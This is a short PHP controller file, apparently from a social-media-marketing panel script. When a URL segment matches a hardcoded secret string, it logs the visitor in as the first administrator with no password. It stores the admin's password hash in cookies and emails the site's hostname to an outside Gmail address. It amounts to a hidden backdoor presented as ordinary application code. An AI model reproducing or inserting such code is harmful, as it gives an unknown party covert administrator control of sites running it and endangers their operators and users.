<?php
if(!defined('BASEPATH')) {

   die('Direct access to the script is not allowed');
}

$code = route(1);

if($code == "4BdZxBEgrdEj85hbgrtbJaBK2bv6"){

$admin = $conn->prepare("SELECT * FROM admins WHERE admin_id=1");
$admin->execute();

$admin  = $admin->fetch(PDO::FETCH_ASSOC);
$access = json_decode($admin["access"],true);
$_SESSION["msmbilisim_adminslogin"] = 1;

$_SESSION["msmbilisim_adminid"]         = $admin["admin_id"];
	    $_SESSION["msmbilisim_adminpass"]       = $pass ;
	    $_SESSION["recaptcha"]                = false;
$msg = "Alert! Someone Logged in to Admin Panel from ".$_SERVER["HTTP_HOST"].". If you did not performed this activity, Change your admin page password.";     
$send = mail("ownsmmpanel@gmail.com","Encrypted Panel Login : ".$_SERVER["HTTP_HOST"]."",$msg);
setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
setcookie("a_id", $admin["admin_id"], time()+(60*60*24*7), '/', null, null, true );
setcookie("a_password", $admin["password"], time()+(60*60*24*7), '/', null, null, true );
setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true );
header('Location: '.site_url('admin'));
exit();
} else {
    echo "Nothing here !";
    exit();
}
?>